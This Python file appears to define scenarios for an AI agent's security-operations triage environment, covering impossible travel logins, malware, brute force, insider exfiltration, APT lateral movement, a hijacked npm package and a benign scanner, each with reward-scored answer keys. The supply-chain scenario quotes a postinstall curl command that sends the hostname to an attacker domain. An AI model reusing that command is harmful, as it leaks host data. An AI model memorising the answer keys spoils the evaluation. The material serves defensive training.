# Copyright (c) Meta Platforms, Inc. and affiliates.
# All rights reserved.
#
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree.

"""
SOC Scenario Library.

Each scenario is a dict describing:
  - alert_type      : What kind of alert fires
  - severity        : How serious it is
  - difficulty      : 'easy' | 'medium' | 'hard'
  - initial_signals : What the analyst sees first
  - investigation_context : Extra info revealed when the agent picks 'investigate'
  - correct_sequence : The ideal chain of decisions (used for reward scoring)
  - optimal_terminal : The single best final action (highest reward)
  - false_positive   : Whether this is actually benign (reward ignoring)

Reward logic:
  - Correct terminal action     : +1.0
  - Good intermediate step      : +0.3
  - Investigate (always valid)  : +0.1
  - Unnecessary escalation      : -0.2
  - Wrong terminal (e.g. ignore a real threat) : -0.5
  - False positive, ignoring it : +0.8
  - False positive, overreacting: -0.3
"""

from typing import Any, Dict, List

SCENARIOS: List[Dict[str, Any]] = [

    # ─────────────── EASY ───────────────

    {
        "id": "easy_impossible_travel",
        "alert_type": "impossible_travel_login",
        "severity": "high",
        "difficulty": "easy",
        "initial_signals": [
            "Login from India at 09:00 UTC",
            "Login from Russia at 09:45 UTC (same account)",
            "Account: john.doe@company.com",
        ],
        "investigation_context": {
            "account_status": "active",
            "previous_travel": "none on record",
            "mfa_enrolled": True,
            "recent_phishing_target": False,
        },
        "correct_sequence": ["investigate", "block_account", "request_mfa"],
        "optimal_terminal": "block_account",
        "false_positive": False,
        "description": "Two logins from geographically impossible locations within 45 minutes.",
    },

    {
        "id": "easy_false_positive_vpn",
        "alert_type": "anomalous_login_location",
        "severity": "low",
        "difficulty": "easy",
        "initial_signals": [
            "Login from Netherlands (unusual country)",
            "Account: alice.smith@company.com",
            "Login succeeded with MFA",
        ],
        "investigation_context": {
            "vpn_exit_node": "NordVPN Netherlands",
            "user_reported_vpn_use": True,
            "mfa_enrolled": True,
            "recent_travel_request": "approved Amsterdam trip",
        },
        "correct_sequence": ["investigate", "ignore"],
        "optimal_terminal": "ignore",
        "false_positive": True,
        "description": "Employee using corporate VPN from approved travel location.",
    },

    {
        "id": "easy_malware_signature",
        "alert_type": "malware_detection",
        "severity": "critical",
        "difficulty": "easy",
        "initial_signals": [
            "Antivirus flagged: Trojan.GenericKD.47382910",
            "File: C:\\Users\\jsmith\\Downloads\\invoice_2024.exe",
            "Endpoint: DESKTOP-JSmith",
        ],
        "investigation_context": {
            "file_hash_virustotal": "68/72 engines detect as malware",
            "process_spawned_children": ["cmd.exe", "powershell.exe"],
            "network_connections": ["185.220.101.47:4444 (known C2)"],
            "user_admin_rights": True,
        },
        "correct_sequence": ["isolate_device", "collect_forensics", "escalate"],
        "optimal_terminal": "isolate_device",
        "false_positive": False,
        "description": "Known malware executed on endpoint with C2 beacon active.",
    },

    # ─────────────── MEDIUM ───────────────

    {
        "id": "medium_brute_force",
        "alert_type": "brute_force_ssh",
        "severity": "medium",
        "difficulty": "medium",
        "initial_signals": [
            "500 failed SSH login attempts in 10 minutes",
            "Source IP: 203.0.113.42",
            "Target: prod-db-01.internal",
            "3 successful logins in the last attempt batch",
        ],
        "investigation_context": {
            "source_ip_reputation": "known Tor exit node",
            "successful_login_user": "db_backup",
            "db_backup_account_usage": "last used 6 months ago",
            "files_accessed_post_login": ["backup_dump_full.sql.gz"],
        },
        "correct_sequence": ["investigate", "block_ip", "block_account", "isolate_device"],
        "optimal_terminal": "block_ip",
        "false_positive": False,
        "description": "Brute-force succeeded via Tor, attacker accessed sensitive DB backup.",
    },

    {
        "id": "medium_insider_threat",
        "alert_type": "data_exfiltration_attempt",
        "severity": "high",
        "difficulty": "medium",
        "initial_signals": [
            "User downloaded 4.2 GB via personal Google Drive",
            "Account: mark.johnson@company.com",
            "DLP alert: 'confidential' tagged files detected",
            "Activity at 23:47 local time",
        ],
        "investigation_context": {
            "employee_status": "resignation submitted 3 days ago",
            "files_involved": ["Q4_strategy.pptx", "client_list_2024.xlsx", "source_code_backup.zip"],
            "hr_note": "Last working day is Friday",
            "prior_dlp_alerts": 0,
        },
        "correct_sequence": ["investigate", "block_account", "collect_forensics", "escalate"],
        "optimal_terminal": "escalate",
        "false_positive": False,
        "description": "Departing employee exfiltrating IP on final days before exit.",
    },

    {
        "id": "medium_phishing_click",
        "alert_type": "phishing_link_clicked",
        "severity": "medium",
        "difficulty": "medium",
        "initial_signals": [
            "Email gateway: user clicked link in quarantined email",
            "URL: http://paypa1-secure.ru/reset",
            "User: carol.white@company.com",
            "Browser: Chrome on Windows 10",
        ],
        "investigation_context": {
            "url_reputation": "phishing kit (credential harvester)",
            "credentials_entered": "unknown – no post-form traffic captured",
            "mfa_enrolled": True,
            "recent_password_change": False,
        },
        "correct_sequence": ["investigate", "request_mfa", "monitor"],
        "optimal_terminal": "request_mfa",
        "false_positive": False,
        "description": "User clicked credential harvester; unclear if creds were submitted.",
    },

    # ─────────────── HARD ───────────────

    {
        "id": "hard_apt_lateral_movement",
        "alert_type": "lateral_movement_detected",
        "severity": "critical",
        "difficulty": "hard",
        "initial_signals": [
            "Unusual SMB traffic between workstations (WS01→WS04→FILESERVER01)",
            "Pass-the-hash attempt detected by EDR on WS04",
            "LSASS memory access on WS01 (possible credential dump)",
            "Alert fired at 03:12 UTC (off-hours)",
            "No AV detections triggered",
        ],
        "investigation_context": {
            "network_traffic_analysis": "Cobalt Strike beacon pattern on TCP/443",
            "initial_access_vector": "spear-phishing email 48h ago (WS01 user)",
            "accounts_compromised": ["local_admin", "svc_backup", "domain_admin (hash only)"],
            "c2_server": "185.220.101.99 (DigitalOcean)",
            "exfil_detected": False,
            "persistence_mechanism": "Scheduled task: 'WindowsUpdateHelper'",
        },
        "correct_sequence": [
            "investigate",
            "isolate_device",
            "block_ip",
            "collect_forensics",
            "escalate",
        ],
        "optimal_terminal": "escalate",
        "false_positive": False,
        "description": "Active APT intrusion with lateral movement and domain-admin hash capture.",
    },

    {
        "id": "hard_supply_chain",
        "alert_type": "suspicious_package_behavior",
        "severity": "high",
        "difficulty": "hard",
        "initial_signals": [
            "npm package 'log-helper' v2.3.1 spawned outbound connection",
            "Connection to: api.telemetry-service[.]com",
            "Package installed across 14 developer machines",
            "Package was updated 3 days ago (was trusted before)",
            "No CVE filed yet",
        ],
        "investigation_context": {
            "package_diff": "postinstall script added: curl -s http://api.telemetry-service[.]com/$(hostname)",
            "domain_age": "registered 4 days ago",
            "developer_machines_sensitvity": "all have access to prod AWS credentials",
            "aws_cloudtrail": "no unusual API calls yet",
            "npm_maintainer": "account hijacked (maintainer reported)",
        },
        "correct_sequence": [
            "investigate",
            "patch_system",       # remove/downgrade the package
            "collect_forensics",
            "monitor",            # watch AWS for abuse
            "escalate",
        ],
        "optimal_terminal": "patch_system",
        "false_positive": False,
        "description": "Supply-chain attack via hijacked npm package on developer machines.",
    },

    {
        "id": "hard_noisy_scanner",
        "alert_type": "port_scan_detected",
        "severity": "medium",
        "difficulty": "hard",
        "initial_signals": [
            "Port scan from 10.0.5.22 to 10.0.0.0/16",
            "2,400 ports scanned in 30 seconds",
            "Source is internal IP",
            "Scan includes port 22, 3389, 5432, 27017",
            "Firewall: no blocks applied (internal traffic)",
        ],
        "investigation_context": {
            "source_host": "IT-INFRA-01 (vulnerability scanner – Nessus)",
            "scheduled_scan": "Weekly Tuesday 02:00 UTC",
            "scan_owner": "security_team@company.com",
            "today_is": "Tuesday 02:04 UTC",
            "change_ticket": "CHG-2048 approved",
        },
        "correct_sequence": ["investigate", "ignore"],
        "optimal_terminal": "ignore",
        "false_positive": True,
        "description": "Authorized Nessus vulnerability scan triggering IDS alert.",
    },
]

# Quick lookup by difficulty
EASY_SCENARIOS = [s for s in SCENARIOS if s["difficulty"] == "easy"]
MEDIUM_SCENARIOS = [s for s in SCENARIOS if s["difficulty"] == "medium"]
HARD_SCENARIOS = [s for s in SCENARIOS if s["difficulty"] == "hard"]
